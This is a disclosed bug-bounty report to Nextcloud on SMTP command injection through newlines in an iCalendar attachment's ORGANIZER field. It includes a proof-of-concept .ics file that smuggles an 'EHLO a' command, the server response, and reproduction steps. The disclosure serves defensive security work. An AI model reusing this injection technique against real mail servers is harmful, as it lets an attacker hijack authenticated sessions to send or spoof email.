# SMTP Command Injection in iCalendar Attachments to Emails via Newlines

## Report Details
- **Report ID**: 1516377
- **URL**: https://hackerone.com/reports/1516377
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-03-19T08:41:01.706Z
- **Disclosed**: 2022-07-04T13:10:26.031Z

## Reporter
- **Username**: spaceraccoon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Note: This is similar to {1509216}, but has a new source/attack vector. Apologies for not picking this up earlier.

## Summary:
When users receive iCalendar attachments in Mail, there is an option to add it to their calendar:

██████████

Once they add it to calendar, a PUT request is sent:

```
PUT /remote.php/dav/calendars/nextcloud/personal/██████.ics HTTP/2
Host: 192.168.92.132

BEGIN:VCALENDAR
PRODID:-//Nextcloud Mail
BEGIN:VTIMEZONE
TZID:Asia/Singapore
BEGIN:STANDARD
TZOFFSETFROM:+0800
TZOFFSETTO:+0800
TZNAME:+08
DTSTART:19700101T000000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
CREATED:20220319T044448Z
DTSTAMP:20220319T080250Z
LAST-MODIFIED:20220319T080250Z
SEQUENCE:2
UID:a027641d-9f3a-4570-8cff-aa5cde0ba323
DTSTART;TZID=Asia/Singapore:20220322T100000
DTEND;TZID=Asia/Singapore:20220322T110000
STATUS:CONFIRMED
SUMMARY:Normal Event
ATTENDEE;CN=nextcloud;CUTYPE=INDIVIDUAL;PARTSTAT=DECLINED;ROLE=REQ-PARTICIP
 ANT;RSVP=TRUE;LANGUAGE=en:mailto:███
ORGANIZER;CN=Normal User:mailto:<ORGANIZER EMAIL>
END:VEVENT
END:VCALENDAR
```

At the same time, an SMTP pipelined command is sent to the email server to email <ORGANIZER EMAIL> that the user has accepted the event.

Unfortunately, since `<ORGANIZER EMAIL>` is not sanitized, if an attacker sends a poisoned iCalendar file with newlines in the `ORGANIZER` property, this will inject newlines in the pipelined SMTP commands, allowing the attacker to inject arbitrary SMTP commands.

These commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.

For example, an attacker can inject a simple `EHLO a` command:

```
BEGIN:VCALENDAR
CALSCALE:GREGORIAN
VERSION:2.0
PRODID:-//Nextcloud Mail
BEGIN:VEVENT
CREATED:20220319T044448Z
DTSTAMP:20220319T080250Z
LAST-MODIFIED:20220319T080250Z
SEQUENCE:2
UID:a027641d-9f3a-4570-8cff-aa5cde0ba323
DTSTART;TZID=Asia/Singapore:20220322T100000
DTEND;TZID=Asia/Singapore:20220322T110000
STATUS:CONFIRMED
SUMMARY:Normal Event
ATTENDEE;CN=nextcloud;CUTYPE=INDIVIDUAL;PARTSTAT=DECLINED;ROLE=REQ-PARTICIP
 ANT;RSVP=TRUE;LANGUAGE=en:mailto:████
ORGANIZER;CN=Normal User:mailto:test(\nEHLO a\n)@gmail.com
END:VEVENT
BEGIN:VTIMEZONE
TZID:Asia/Singapore
BEGIN:STANDARD
TZOFFSETFROM:+0800
TZOFFSETTO:+0800
TZNAME:+08
DTSTART:19700101T000000
END:STANDARD
END:VTIMEZONE
END:VCALENDAR
```

Which for Gmail would return:

```
{"status":"error","message":"Could not send mail: Expected response code 354 but got code \"250\", with message \"250-smtp.gmail.com at your service, [116.89.6.224]\r\n250-SIZE 35882577\r\n250-8BITMIME\r\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\r\n250-ENHANCEDSTATUSCODES\r\n250-PIPELINING\r\n250-CHUNKING\r\n250 SMTPUTF8\r\n\"","data":{"type":"OCA\\Calendar\\Exception\\ServiceException","message":"Could not send mail: Expected response code 354 but got code \"250\", with message \"250-smtp.gmail.com at your service, [116.89.6.224]\r\n250-SIZE 35882577\r\n250-8BITMIME\r\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\r\n250-ENHANCEDSTATUSCODES\r\n250-PIPELINING\r\n250-CHUNKING\r\n250 SMTPUTF8\r\n\"","code":250,
```

Note that for this report, the commands are blind; but can be used remotely if changing the sender/recipient. I added additional logging to `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to confirm that the commands were injected.

## Steps To Reproduce:

Note: Email sending should be set up in the admin settings.

Setup `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to log SMTP commands. I inserted the following at line 343: `file_put_contents('/tmp/test.log',$response,FILE_APPEND);` (under `$response = $this->getFullResponse($seq);`). I also inserted the following at line 327: `file_put_contents('/tmp/test.log',$command,FILE_APPEND);` (below `$failures = (array) $failures;`).

  1. At an external email, send the victim nextcloud email the attachment ███████. Modify `█████` in the file to the victim's email. 
  2. As the victim, check email in nextcloud.  Click the 3 dots beside `event.ics` > Import into Calendar > Personal. This triggers the PUT request.
  3. Check `/tmp/test.log`. Confirm that the newlines and arbitrary `EHLO a` SMTP commands have been injected and sent to the server.

## Impact

The impact varies based on which commands are supported by the backend SMTP server. However, the main risk here is that the attacker can then hijack an already-authenticated SMTP session and run arbitrary SMTP commands as the email user, such as sending emails to other users, changing the FROM user, and so on. As before, this depends on the configuration of the server itself, but newlines should be sanitized to mitigate such arbitrary SMTP command injection.

## Attachments
No attachments
